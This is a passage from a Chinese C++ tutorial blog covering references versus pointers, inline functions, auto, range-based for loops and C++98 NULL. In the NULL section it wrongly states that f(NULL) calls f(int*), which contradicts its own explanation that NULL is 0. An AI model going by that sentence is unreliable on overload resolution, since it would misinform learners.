	<span class="token keyword">int</span><span class="token operator">&amp;</span> ra <span class="token operator">=</span> a<span class="token punctuation">;</span>
	ra <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>

	<span class="token comment">// 在语法上，这里定义了一个pa指针，开辟了4个字节的空间，用于存储a的地址</span>
	<span class="token keyword">int</span><span class="token operator">*</span> pa <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>
	<span class="token operator">*</span>pa <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>

	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"&amp;a = "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"&amp;ra = "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>ra <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"&amp;pa = "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>pa <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>我们来看下引用和指针的 <strong>汇编代码</strong> 对比：<br> <img src="https://images2.imgbox.com/b1/3b/ErIPArdD_o.png" alt="在这里插入图片描述"></p> 
<h2>
<a id="__818"></a>? 引用和指针的区别</h2> 
<p><strong>重点内容：</strong></p> 
<blockquote> 
 <p>1） 引用在定义时必须初始化，指针没有要求。<br>  <br> 2） 引用在初始化时引用一个实体后，就不能再引用其他实体，而指针可以在任何时候指向任何一个同类型实体。<br>  <br> 3）没有 <strong>NULL</strong> 引用，但有 <strong>NULL</strong> 指针。<br>  <br> 4）在 <strong>sizeof</strong> 中含义不同：引用结果为引用类型的大小，但指针始终是地址空间所占字节个数（<strong>32</strong> 位平台下占 <strong>4</strong> 个字节）。<br>  <br> 5）引用自加即引用的实体增加 <strong>1</strong>，指针自加即指针向后偏移一个类型的大小。<br>  <br> 6） 有多级指针，但是没有多级引用。<br>  <br> 7）访问实体方式不同，指针需要显式解引用，引用编译器自己处理。<br>  <br> 8）引用比指针使用起来相对更安全。</p> 
</blockquote> 
<h1>
<a id="7__838"></a>7. 内联函数</h1> 
<p>在程序中，大量重复的建立函数栈帧 (如 <strong>swap</strong> 等函数) 会造成很大的性能开销。</p> 
<p>在 <strong>C</strong> 语言可以用宏来代替函数，使之不会开辟栈帧，虽然宏的优点多，但也有不少的缺点，这时 <strong>内联函数</strong> 就可以针对这种场景解决问题 (<strong>内联函数对标宏函数</strong>)。</p> 
<h2>
<a id="__843"></a>? 内敛函数的概念</h2> 
<p>以 <strong>inline</strong> 修饰的函数叫做内联函数，编译时，<strong>C++</strong> 编译器会在调用内联函数的地方展开，没有函数压栈的开销，内联函数提升程序运行的效率。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>这就是一个简单的 <strong>加法</strong> 函数，我们可以转到 <strong>反汇编</strong>，然后能看到调用栈帧的过程。<br> <img src="https://images2.imgbox.com/cf/35/VrPeFNcb_o.png" alt="在这里插入图片描述"></p> 
<p>如果在上述函数前增加 <strong>inline</strong> 关键字将其改成内联函数，在编译期间编译器会用函数体替换函数的调用。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>此时，我们需要在 <strong>release</strong> 模式下，查看编译器生成的汇编代码中是否存在 <code>call Add</code><br> <img src="https://images2.imgbox.com/40/66/DOl2fmr6_o.png" alt="在这里插入图片描述"></p> 
<p>从汇编代码中可以看出，内联函数调用时并没有调用函数这个过程的汇编指令。</p> 
<h2>
<a id="__894"></a>? 内敛函数的特性</h2> 
<p><strong>重点内容：</strong></p> 
<blockquote> 
 <p>1）<strong>inline</strong> 是一种以空间换时间的做法，省去调用函数额开销。所以 <strong>代码很长</strong> 或者 <strong>有循环</strong> 或者 <strong>有递归</strong> 的函数不适宜使用作为内联函数。<br>  <br> 2） <strong>inline</strong> 对于编译器而言只是一个建议，编译器会自动优化，如果定义为 <strong>inline</strong> 的函数体内 <strong>有循环</strong> 或者 <strong>有递归</strong> 等等，编译器优化时会忽略掉内联。<br>  <br> 3）<strong>inline</strong> 不建议声明和定义分离，分离会导致链接错误。因为 <strong>inline</strong> 被展开，就没有函数地址了，链接就会找不到。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token comment">// F.h</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// F.cpp</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"F.h"</span></span>
<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
 cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// main.cpp</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"F.h"</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
 <span class="token function">f</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 链接错误：main.obj : error LNK2019: 无法解析的外部符号 "void __cdecl f(int)" (?f@@YAXH@Z)，该符号在函数 _main 中被引用</span>
</code></pre> 
<h1>
<a id="8_auto_927"></a>8. auto关键字</h1> 
<blockquote> 
 <p><strong>auto</strong> 是 <strong>C++11</strong> 中的关键字。</p> 
</blockquote> 
<h2>
<a id="_auto_930"></a>? auto简介</h2> 
<p>在早期 <strong>C/C++</strong> 中 <strong>auto</strong> 的含义是：使用 <strong>auto</strong> 修饰的变量，是具有自动存储器的局部变量。</p> 
<blockquote> 
 <p>但遗憾的是一直没有人去使用它，大家可思考下为什么？</p> 
</blockquote> 
<p><strong>C++11</strong> 中，标准委员会赋予了 <strong>auto</strong> 全新的含义即：<strong>auto 不再是一个存储类型指示符，而是作为一个新的类型指示符来指示编译器，auto 声明的变量必须由编译器在编译时期推导而得。</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">double</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token number">3.14</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token keyword">auto</span> c <span class="token operator">=</span> <span class="token char">'A'</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> d <span class="token operator">=</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/56/a5/ZaIFrZN8_o.png" alt="在这里插入图片描述"></p> 
<p><strong>注意：</strong></p> 
<blockquote> 
 <p>使用 <strong>auto</strong> 定义变量时必须对其进行初始化，在编译阶段编译器需要根据初始化表达式来推导 <strong>auto</strong> 的实际类型。<br>  <br> 因此 <strong>auto</strong> 并非是一种 “类型” 的声明，而是一个类型声明时的 “占位符”，编译器在编译期会将 <strong>auto</strong> 替换为变量实际的类型。</p> 
</blockquote> 
<h2>
<a id="_auto_970"></a>? auto的使用细则</h2> 
<p><strong>（1）auto 与指针和引用结合起来使用</strong></p> 
<blockquote> 
 <p>用 <strong>auto</strong> 声明指针类型时，用 <code>auto</code> 和 <code>auto*</code> 没有任何区别，但用 <strong>auto</strong> 声明引用类型时则必须加 <code>&amp;</code>。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> b <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span> <span class="token comment">// 自动推导出b的类型为int*</span>
	<span class="token keyword">auto</span><span class="token operator">*</span> c <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span> <span class="token comment">// 自动推导出c的类型为int*</span>
	<span class="token keyword">auto</span><span class="token operator">&amp;</span> d <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">// d是a的引用，自动推导出d的类型为int</span>

	cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 打印结果为int*</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 打印结果为int*</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 打印结果为int</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/83/40/PcuMsr6r_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>注意：用 <strong>auto 声明引用时</strong> 必须加 <strong>&amp;</strong>，否则创建的只是与实体类型相同的普通变量。</p> 
</blockquote> 
<p><strong>（2）在同一行定义多个变量</strong></p> 
<blockquote> 
 <p>当在同一行声明多个变量时，这些变量必须是相同的类型，否则编译器将会报错，因为编译器实际只对第一个类型进行推导，然后用推导出来的类型定义其他变量。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">auto</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>

	<span class="token keyword">auto</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span> <span class="token comment">// 编译器报错：“auto”必须始终推导为同一类型</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h2>
<a id="_auto_1015"></a>? auto不能推导的场景</h2> 
<p><strong>（1）auto 不能作为函数的参数</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token comment">// 此处代码编译失败，auto不能作为形参类型，因为编译器无法对a的实际类型进行推导</span>
<span class="token keyword">void</span> <span class="token function">TestAuto</span><span class="token punctuation">(</span><span class="token keyword">auto</span> a<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>（2）auto 不能直接用来声明数组</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token keyword">void</span> <span class="token function">TestAuto</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
 	<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
 	<span class="token keyword">auto</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token number">4</span>，<span class="token number">5</span>，<span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 此处编译失败，错误写法</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>（3） 为了避免与 C++98 中的 auto 发生混淆，C++11 只保留了 auto 作为类型指示符的用法</strong></p> 
<p><strong>（4）auto 在实际中最常见的优势用法就是跟 C++11 提供的新式 for 循环，还有 lambda 表达式等进行配合使用。</strong></p> 
<h1>
<a id="9__for_1041"></a>9. 基于范围的for循环</h1> 
<blockquote> 
 <p>这也是 <strong>C++11</strong> 中的特性。</p> 
</blockquote> 
<h2>
<a id="_for_1044"></a>? 范围for的语法</h2> 
<p>在 <strong>C++98</strong> 中如果要遍历一个数组，可以按照以下方式进行：</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token comment">// 将数组元素值全部乘以2</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// 打印数组中的所有元素</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		cout <span class="token operator">&lt;&lt;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/f9/1f/5RMkPbB5_o.png" alt="在这里插入图片描述"></p> 
<p>以上方式是我们 <strong>C</strong> 语言中所用的遍历数组的方式，对于一个有范围的集合而言，循环的范围是多余的，有时候还会容易犯错误。</p> 
<p>因此 <strong>C++11</strong> 中引入了基于范围的 <strong>for</strong> 循环。</p> 
<p><strong>for</strong> 循环后的括号由冒号 <code>:</code> 分为两部分：<strong>第一部分是范围内用于迭代的变量，第二部分则表示被迭代的范围。</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token comment">// 将数组元素值全部乘以2</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> e <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		e <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// 打印数组中的所有元素</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> e <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		cout <span class="token operator">&lt;&lt;</span> e <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/3e/4e/GLdbNRch_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p><strong>注意：与普通循环类似，可以用 continue 来结束本次循环，也可以用 break 来跳出整个循环。</strong></p> 
</blockquote> 
<h2>
<a id="_for_1111"></a>? 范围for的使用条件</h2> 
<p><strong>（1）for 循环迭代的范围必须是确定的</strong></p> 
<blockquote> 
 <p>对于数组而言，就是数组中第一个元素和最后一个元素的范围；<br>  <br> 对于类而言，应该提供 <strong>begin</strong> 和 <strong>end</strong> 的方法，<strong>begin</strong> 和 <strong>end</strong> 就是 <strong>for</strong> 循环迭代的范围。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token keyword">void</span> <span class="token function">TestFor</span><span class="token punctuation">(</span><span class="token keyword">int</span> array<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
 	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> e <span class="token operator">:</span> array<span class="token punctuation">)</span>
 	cout<span class="token operator">&lt;&lt;</span> e <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>注意：上述代码就有问题，因为 <strong>for</strong> 的范围不确定。</p> 
</blockquote> 
<p><strong>（2）迭代的对象要实现 ++ 和 == 的操作。</strong></p> 
<blockquote> 
 <p>这是关于迭代器的问题，后续文章会讲。</p> 
</blockquote> 
<h1>
<a id="10__nullptr_1131"></a>10. 指针空值nullptr</h1> 
<blockquote> 
 <p>这也是 <strong>C++11</strong> 中的特性</p> 
</blockquote> 
<h2>
<a id="_C98_1134"></a>? C++98中的指针空值</h2> 
<p>在良好的 <strong>C/C++</strong> 编程习惯中，声明一个变量时最好给该变量一个合适的初始值，否则可能会出现不可预料的错误，比如未初始化的指针。</p> 
<p>如果一个指针没有合法的指向，我们基本都是按照如下方式对其进行初始化。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token keyword">void</span> <span class="token function">TestPtr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
 	<span class="token keyword">int</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
 	<span class="token keyword">int</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>NULL</strong> 其实是一个宏，在传统的 <strong>C</strong> 头文件 <code>(stddef.h)</code> 中可以看到如下代码：</p> 
<pre><code class="prism language-cpp"><span class="token comment">/* Define NULL pointer value */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression"><span class="token constant">NULL</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NULL</span>    <span class="token expression"><span class="token number">0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span>  <span class="token comment">/* __cplusplus */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NULL</span>    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span>  <span class="token comment">/* __cplusplus */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span>  <span class="token comment">/* NULL */</span></span>
</code></pre> 
<p>可以看到，<strong>NULL</strong> 可能被定义为字面常量 <strong>0</strong>，或者被定义为无类型指针 <code>(void*)</code> 的常量。</p> 
<p>不论采取何种定义，在使用空值的指针时，都不可避免的会遇到一些麻烦，比如：</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int*)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>程序本意是想通过 <code>f(NULL)</code> 调用指针版本的 <code>f(int*)</code> 函数，但是由于 <strong>NULL</strong> 被定义成 <strong>0</strong>，所以 <code>f(NULL)</code>最终调用的是 <code>f(int*)</code> 函数。</p> 
</blockquote> 
<p><strong>注意：</strong></p> 
<blockquote> 
 <p>在 <strong>C++98</strong> 中，字面常量 <strong>0</strong> 既可以是一个整形数字，也可以是无类型的指针 <code>(void*)</code> 常量。<br>  <br> 但是编译器默认情况下将其看成是一个整形常量，如果要将其按照指针方式来使用，必须对其进行强转<code>(void *)0</code>。</p> 
</blockquote> 
<h2>
<a id="_C11_1192"></a>? C++11中的指针空值</h2> 
